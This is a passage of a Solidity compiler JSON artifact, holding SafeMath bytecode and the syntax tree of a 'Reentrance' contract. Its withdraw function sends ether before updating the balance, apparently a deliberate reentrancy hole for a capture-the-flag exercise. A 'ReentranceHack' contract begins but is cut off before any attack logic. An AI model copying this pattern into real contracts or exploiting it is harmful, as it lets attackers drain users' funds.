							"opcodes": "PUSH1 0x56 PUSH1 0x23 PUSH1 0xB DUP3 DUP3 DUP3 CODECOPY DUP1 MLOAD PUSH1 0x0 BYTE PUSH1 0x73 EQ PUSH1 0x16 JUMPI INVALID JUMPDEST ADDRESS PUSH1 0x0 MSTORE PUSH1 0x73 DUP2 MSTORE8 DUP3 DUP2 RETURN INVALID PUSH20 0x0 ADDRESS EQ PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x0 DUP1 REVERT INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 ADDRESS 0xCB PUSH15 0x63ED0C592B58A945EA71862980410E SWAP12 0xAE BALANCE DIFFICULTY BYTE PUSH7 0x75F437262F9C35 CODECOPY PUSH5 0x736F6C6343 STOP MOD 0xC STOP CALLER ",
							"sourceMap": "622:4588:2:-:0;;;;;;;;;;;;;;;;;;;;;;;;;"
						},
						"deployedBytecode": {
							"immutableReferences": {},
							"linkReferences": {},
							"object": "73000000000000000000000000000000000000000030146080604052600080fdfea264697066735822122030cb6e63ed0c592b58a945ea71862980410e9bae31441a6675f437262f9c353964736f6c634300060c0033",
							"opcodes": "PUSH20 0x0 ADDRESS EQ PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x0 DUP1 REVERT INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 ADDRESS 0xCB PUSH15 0x63ED0C592B58A945EA71862980410E SWAP12 0xAE BALANCE DIFFICULTY BYTE PUSH7 0x75F437262F9C35 CODECOPY PUSH5 0x736F6C6343 STOP MOD 0xC STOP CALLER ",
							"sourceMap": "622:4588:2:-:0;;;;;;;;"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "17200",
								"executionCost": "97",
								"totalCost": "17297"
							},
							"internal": {
								"add(uint256,uint256)": "infinite",
								"div(uint256,uint256)": "infinite",
								"div(uint256,uint256,string memory)": "infinite",
								"mod(uint256,uint256)": "infinite",
								"mod(uint256,uint256,string memory)": "infinite",
								"mul(uint256,uint256)": "infinite",
								"sub(uint256,uint256)": "infinite",
								"sub(uint256,uint256,string memory)": "infinite"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 622,
									"end": 5210,
									"name": "PUSH #[$]",
									"source": 2,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 622,
									"end": 5210,
									"name": "PUSH [$]",
									"source": 2,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 622,
									"end": 5210,
									"name": "PUSH",
									"source": 2,
									"value": "B"
								},
								{
									"begin": 622,
									"end": 5210,
									"name": "DUP3",
									"source": 2
								},
								{
									"begin": 622,
									"end": 5210,
									"name": "DUP3",
									"source": 2
								},
								{
									"begin": 622,
									"end": 5210,
									"name": "DUP3",
									"source": 2
								},
								{
									"begin": 622,
									"end": 5210,
									"name": "CODECOPY",
									"source": 2
								},
								{
									"begin": 622,
									"end": 5210,
									"name": "DUP1",
									"source": 2
								},
								{
									"begin": 622,
									"end": 5210,
									"name": "MLOAD",
									"source": 2
								},
								{
									"begin": 622,
									"end": 5210,
									"name": "PUSH",
									"source": 2,
									"value": "0"
								},
								{
									"begin": 622,
									"end": 5210,
									"name": "BYTE",
									"source": 2
								},
								{
									"begin": 622,
									"end": 5210,
									"name": "PUSH",
									"source": 2,
									"value": "73"
								},
								{
									"begin": 622,
									"end": 5210,
									"name": "EQ",
									"source": 2
								},
								{
									"begin": 622,
									"end": 5210,
									"name": "PUSH [tag]",
									"source": 2,
									"value": "1"
								},
								{
									"begin": 622,
									"end": 5210,
									"name": "JUMPI",
									"source": 2
								},
								{
									"begin": 622,
									"end": 5210,
									"name": "INVALID",
									"source": 2
								},
								{
									"begin": 622,
									"end": 5210,
									"name": "tag",
									"source": 2,
									"value": "1"
								},
								{
									"begin": 622,
									"end": 5210,
									"name": "JUMPDEST",
									"source": 2
								},
								{
									"begin": 622,
									"end": 5210,
									"name": "ADDRESS",
									"source": 2
								},
								{
									"begin": 622,
									"end": 5210,
									"name": "PUSH",
									"source": 2,
									"value": "0"
								},
								{
									"begin": 622,
									"end": 5210,
									"name": "MSTORE",
									"source": 2
								},
								{
									"begin": 622,
									"end": 5210,
									"name": "PUSH",
									"source": 2,
									"value": "73"
								},
								{
									"begin": 622,
									"end": 5210,
									"name": "DUP2",
									"source": 2
								},
								{
									"begin": 622,
									"end": 5210,
									"name": "MSTORE8",
									"source": 2
								},
								{
									"begin": 622,
									"end": 5210,
									"name": "DUP3",
									"source": 2
								},
								{
									"begin": 622,
									"end": 5210,
									"name": "DUP2",
									"source": 2
								},
								{
									"begin": 622,
									"end": 5210,
									"name": "RETURN",
									"source": 2
								}
							],
							".data": {
								"0": {
									".auxdata": "a264697066735822122030cb6e63ed0c592b58a945ea71862980410e9bae31441a6675f437262f9c353964736f6c634300060c0033",
									".code": [
										{
											"begin": 622,
											"end": 5210,
											"name": "PUSHDEPLOYADDRESS",
											"source": 2
										},
										{
											"begin": 622,
											"end": 5210,
											"name": "ADDRESS",
											"source": 2
										},
										{
											"begin": 622,
											"end": 5210,
											"name": "EQ",
											"source": 2
										},
										{
											"begin": 622,
											"end": 5210,
											"name": "PUSH",
											"source": 2,
											"value": "80"
										},
										{
											"begin": 622,
											"end": 5210,
											"name": "PUSH",
											"source": 2,
											"value": "40"
										},
										{
											"begin": 622,
											"end": 5210,
											"name": "MSTORE",
											"source": 2
										},
										{
											"begin": 622,
											"end": 5210,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 622,
											"end": 5210,
											"name": "DUP1",
											"source": 2
										},
										{
											"begin": 622,
											"end": 5210,
											"name": "REVERT",
											"source": 2
										}
									]
								}
							}
						},
						"methodIdentifiers": {}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.6.12+commit.27d51765\"},\"language\":\"Solidity\",\"output\":{\"abi\":[],\"devdoc\":{\"details\":\"Wrappers over Solidity's arithmetic operations with added overflow checks. Arithmetic operations in Solidity wrap on overflow. This can easily result in bugs, because programmers usually assume that an overflow raises an error, which is the standard behavior in high level programming languages. `SafeMath` restores this intuition by reverting the transaction when an operation overflows. Using this library instead of the unchecked operations eliminates an entire class of bugs, so it's recommended to use it always.\",\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/SafeMath.sol\":\"SafeMath\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/SafeMath.sol\":{\"keccak256\":\"0xaa0e11a791bc975d581a4f5b7a8d9c16a880a354c89312318ae072ae3e740409\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://982d8b344f76193834260436d74c81e5a8f9e89106bb4cd72bbaabda4f3f59c2\",\"dweb:/ipfs/QmSrvP5TkQRhKDVCTpsV3uaKLBhkt7PjUY89vdtM9o5ybK\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"kind": "user",
						"methods": {},
						"version": 1
					}
				}
			}
		},
		"sources": {
			"contracts/Reentrance.sol": {
				"ast": {
					"absolutePath": "contracts/Reentrance.sol",
					"exportedSymbols": {
						"Reentrance": [
							81
						],
						"ReentranceHack": [
							155
						]
					},
					"id": 156,
					"license": "MIT",
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 1,
							"literals": [
								"solidity",
								"^",
								"0.6",
								".12"
							],
							"nodeType": "PragmaDirective",
							"src": "32:24:0"
						},
						{
							"absolutePath": "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/SafeMath.sol",
							"file": "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/SafeMath.sol",
							"id": 2,
							"nodeType": "ImportDirective",
							"scope": 156,
							"sourceUnit": 425,
							"src": "58:112:0",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"absolutePath": "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/Math.sol",
							"file": "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/Math.sol",
							"id": 3,
							"nodeType": "ImportDirective",
							"scope": 156,
							"sourceUnit": 229,
							"src": "171:108:0",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"abstract": false,
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "contract",
							"documentation": null,
							"fullyImplemented": true,
							"id": 81,
							"linearizedBaseContracts": [
								81
							],
							"name": "Reentrance",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"id": 6,
									"libraryName": {
										"contractScope": null,
										"id": 4,
										"name": "SafeMath",
										"nodeType": "UserDefinedTypeName",
										"referencedDeclaration": 424,
										"src": "314:8:0",
										"typeDescriptions": {
											"typeIdentifier": "t_contract$_SafeMath_$424",
											"typeString": "library SafeMath"
										}
									},
									"nodeType": "UsingForDirective",
									"src": "308:27:0",
									"typeName": {
										"id": 5,
										"name": "uint256",
										"nodeType": "ElementaryTypeName",
										"src": "327:7:0",
										"typeDescriptions": {
											"typeIdentifier": "t_uint256",
											"typeString": "uint256"
										}
									}
								},
								{
									"constant": false,
									"functionSelector": "27e235e3",
									"id": 10,
									"mutability": "mutable",
									"name": "balances",
									"nodeType": "VariableDeclaration",
									"overrides": null,
									"scope": 81,
									"src": "338:40:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
										"typeString": "mapping(address => uint256)"
									},
									"typeName": {
										"id": 9,
										"keyType": {
											"id": 7,
											"name": "address",
											"nodeType": "ElementaryTypeName",
											"src": "346:7:0",
											"typeDescriptions": {
												"typeIdentifier": "t_address",
												"typeString": "address"
											}
										},
										"nodeType": "Mapping",
										"src": "338:24:0",
										"typeDescriptions": {
											"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
											"typeString": "mapping(address => uint256)"
										},
										"valueType": {
											"id": 8,
											"name": "uint",
											"nodeType": "ElementaryTypeName",
											"src": "357:4:0",
											"typeDescriptions": {
												"typeIdentifier": "t_uint256",
												"typeString": "uint256"
											}
										}
									},
									"value": null,
									"visibility": "public"
								},
								{
									"body": {
										"id": 27,
										"nodeType": "Block",
										"src": "427:55:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"id": 25,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"baseExpression": {
															"argumentTypes": null,
															"id": 15,
															"name": "balances",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 10,
															"src": "433:8:0",
															"typeDescriptions": {
																"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
																"typeString": "mapping(address => uint256)"
															}
														},
														"id": 17,
														"indexExpression": {
															"argumentTypes": null,
															"id": 16,
															"name": "_to",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 12,
															"src": "442:3:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": true,
														"nodeType": "IndexAccess",
														"src": "433:13:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"arguments": [
															{
																"argumentTypes": null,
																"expression": {
																	"argumentTypes": null,
																	"id": 22,
																	"name": "msg",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": -15,
																	"src": "467:3:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_magic_message",
																		"typeString": "msg"
																	}
																},
																"id": 23,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberName": "value",
																"nodeType": "MemberAccess",
																"referencedDeclaration": null,
																"src": "467:9:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															],
															"expression": {
																"argumentTypes": null,
																"baseExpression": {
																	"argumentTypes": null,
																	"id": 18,
																	"name": "balances",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 10,
																	"src": "449:8:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
																		"typeString": "mapping(address => uint256)"
																	}
																},
																"id": 20,
																"indexExpression": {
																	"argumentTypes": null,
																	"id": 19,
																	"name": "_to",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 12,
																	"src": "458:3:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																},
																"isConstant": false,
																"isLValue": true,
																"isPure": false,
																"lValueRequested": false,
																"nodeType": "IndexAccess",
																"src": "449:13:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 21,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "add",
															"nodeType": "MemberAccess",
															"referencedDeclaration": 257,
															"src": "449:17:0",
															"typeDescriptions": {
																"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																"typeString": "function (uint256,uint256) pure returns (uint256)"
															}
														},
														"id": 24,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "functionCall",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "449:28:0",
														"tryCall": false,
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "433:44:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 26,
												"nodeType": "ExpressionStatement",
												"src": "433:44:0"
											}
										]
									},
									"documentation": null,
									"functionSelector": "00362a95",
									"id": 28,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "donate",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 13,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 12,
												"mutability": "mutable",
												"name": "_to",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 28,
												"src": "399:11:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 11,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "399:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "398:13:0"
									},
									"returnParameters": {
										"id": 14,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "427:0:0"
									},
									"scope": 81,
									"src": "383:99:0",
									"stateMutability": "payable",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 39,
										"nodeType": "Block",
										"src": "554:32:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"baseExpression": {
														"argumentTypes": null,
														"id": 35,
														"name": "balances",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 10,
														"src": "567:8:0",
														"typeDescriptions": {
															"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
															"typeString": "mapping(address => uint256)"
														}
													},
													"id": 37,
													"indexExpression": {
														"argumentTypes": null,
														"id": 36,
														"name": "_who",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 30,
														"src": "576:4:0",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"isConstant": false,
													"isLValue": true,
													"isPure": false,
													"lValueRequested": false,
													"nodeType": "IndexAccess",
													"src": "567:14:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 34,
												"id": 38,
												"nodeType": "Return",
												"src": "560:21:0"
											}
										]
									},
									"documentation": null,
									"functionSelector": "70a08231",
									"id": 40,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "balanceOf",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 31,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 30,
												"mutability": "mutable",
												"name": "_who",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 40,
												"src": "505:12:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 29,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "505:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "504:14:0"
									},
									"returnParameters": {
										"id": 34,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 33,
												"mutability": "mutable",
												"name": "balance",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 40,
												"src": "540:12:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 32,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "540:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "539:14:0"
									},
									"scope": 81,
									"src": "486:100:0",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 75,
										"nodeType": "Block",
										"src": "629:195:0",
										"statements": [
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 50,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"baseExpression": {
															"argumentTypes": null,
															"id": 45,
															"name": "balances",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 10,
															"src": "638:8:0",
															"typeDescriptions": {
																"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
																"typeString": "mapping(address => uint256)"
															}
														},
														"id": 48,
														"indexExpression": {
															"argumentTypes": null,
															"expression": {
																"argumentTypes": null,
																"id": 46,
																"name": "msg",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": -15,
																"src": "647:3:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_magic_message",
																	"typeString": "msg"
																}
															},
															"id": 47,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "sender",
															"nodeType": "MemberAccess",
															"referencedDeclaration": null,
															"src": "647:10:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														},
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": false,
														"nodeType": "IndexAccess",
														"src": "638:20:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": ">=",
													"rightExpression": {
														"argumentTypes": null,
														"id": 49,
														"name": "_amount",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 42,
														"src": "662:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "638:31:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 74,
												"nodeType": "IfStatement",
												"src": "635:185:0",
												"trueBody": {
													"id": 73,
													"nodeType": "Block",
													"src": "671:149:0",
													"statements": [
														{
															"assignments": [
																52,
																null
															],
															"declarations": [
																{
																	"constant": false,
																	"id": 52,
																	"mutability": "mutable",
																	"name": "result",
																	"nodeType": "VariableDeclaration",
																	"overrides": null,
																	"scope": 73,
																	"src": "680:11:0",
																	"stateVariable": false,
																	"storageLocation": "default",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bool",
																		"typeString": "bool"
																	},
																	"typeName": {
																		"id": 51,
																		"name": "bool",
																		"nodeType": "ElementaryTypeName",
																		"src": "680:4:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		}
																	},
																	"value": null,
																	"visibility": "internal"
																},
																null
															],
															"id": 60,
															"initialValue": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"hexValue": "",
																		"id": 58,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "string",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "727:2:0",
																		"subdenomination": null,
																		"typeDescriptions": {
																			"typeIdentifier": "t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470",
																			"typeString": "literal_string \"\""
																		},
																		"value": ""
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470",
																			"typeString": "literal_string \"\""
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470",
																				"typeString": "literal_string \"\""
																			}
																		],
																		"expression": {
																			"argumentTypes": null,
																			"expression": {
																				"argumentTypes": null,
																				"id": 53,
																				"name": "msg",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": -15,
																				"src": "696:3:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_magic_message",
																					"typeString": "msg"
																				}
																			},
																			"id": 54,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"memberName": "sender",
																			"nodeType": "MemberAccess",
																			"referencedDeclaration": null,
																			"src": "696:10:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_address_payable",
																				"typeString": "address payable"
																			}
																		},
																		"id": 55,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"memberName": "call",
																		"nodeType": "MemberAccess",
																		"referencedDeclaration": null,
																		"src": "696:15:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_function_barecall_payable$_t_bytes_memory_ptr_$returns$_t_bool_$_t_bytes_memory_ptr_$",
																			"typeString": "function (bytes memory) payable returns (bool,bytes memory)"
																		}
																	},
																	"id": 57,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"names": [
																		"value"
																	],
																	"nodeType": "FunctionCallOptions",
																	"options": [
																		{
																			"argumentTypes": null,
																			"id": 56,
																			"name": "_amount",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 42,
																			"src": "718:7:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		}
																	],
																	"src": "696:30:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_function_barecall_payable$_t_bytes_memory_ptr_$returns$_t_bool_$_t_bytes_memory_ptr_$value",
																		"typeString": "function (bytes memory) payable returns (bool,bytes memory)"
																	}
																},
																"id": 59,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "functionCall",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "696:34:0",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_tuple$_t_bool_$_t_bytes_memory_ptr_$",
																	"typeString": "tuple(bool,bytes memory)"
																}
															},
															"nodeType": "VariableDeclarationStatement",
															"src": "679:51:0"
														},
														{
															"condition": {
																"argumentTypes": null,
																"id": 61,
																"name": "result",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 52,
																"src": "741:6:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"falseBody": null,
															"id": 65,
															"nodeType": "IfStatement",
															"src": "738:37:0",
															"trueBody": {
																"id": 64,
																"nodeType": "Block",
																"src": "749:26:0",
																"statements": [
																	{
																		"expression": {
																			"argumentTypes": null,
																			"id": 62,
																			"name": "_amount",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 42,
																			"src": "759:7:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"id": 63,
																		"nodeType": "ExpressionStatement",
																		"src": "759:7:0"
																	}
																]
															}
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 71,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"baseExpression": {
																		"argumentTypes": null,
																		"id": 66,
																		"name": "balances",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 10,
																		"src": "782:8:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
																			"typeString": "mapping(address => uint256)"
																		}
																	},
																	"id": 69,
																	"indexExpression": {
																		"argumentTypes": null,
																		"expression": {
																			"argumentTypes": null,
																			"id": 67,
																			"name": "msg",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": -15,
																			"src": "791:3:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_magic_message",
																				"typeString": "msg"
																			}
																		},
																		"id": 68,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"memberName": "sender",
																		"nodeType": "MemberAccess",
																		"referencedDeclaration": null,
																		"src": "791:10:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_address_payable",
																			"typeString": "address payable"
																		}
																	},
																	"isConstant": false,
																	"isLValue": true,
																	"isPure": false,
																	"lValueRequested": true,
																	"nodeType": "IndexAccess",
																	"src": "782:20:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "-=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"id": 70,
																	"name": "_amount",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 42,
																	"src": "806:7:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"src": "782:31:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 72,
															"nodeType": "ExpressionStatement",
															"src": "782:31:0"
														}
													]
												}
											}
										]
									},
									"documentation": null,
									"functionSelector": "2e1a7d4d",
									"id": 76,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "withdraw",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 43,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 42,
												"mutability": "mutable",
												"name": "_amount",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 76,
												"src": "608:12:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 41,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "608:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "607:14:0"
									},
									"returnParameters": {
										"id": 44,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "629:0:0"
									},
									"scope": 81,
									"src": "590:234:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 79,
										"nodeType": "Block",
										"src": "855:2:0",
										"statements": []
									},
									"documentation": null,
									"id": 80,
									"implemented": true,
									"kind": "receive",
									"modifiers": [],
									"name": "",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 77,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "835:2:0"
									},
									"returnParameters": {
										"id": 78,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "855:0:0"
									},
									"scope": 81,
									"src": "828:29:0",
									"stateMutability": "payable",
									"virtual": false,
									"visibility": "external"
								}
							],
							"scope": 156,
							"src": "281:578:0"
						},
						{
							"abstract": false,
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "contract",
							"documentation": null,
							"fullyImplemented": true,
							"id": 155,
							"linearizedBaseContracts": [
								155
							],
							"name": "ReentranceHack",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"constant": false,
									"id": 83,
									"mutability": "mutable",
									"name": "reentrance",
									"nodeType": "VariableDeclaration",
									"overrides": null,
									"scope": 155,
									"src": "890:29:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_contract$_Reentrance_$81",
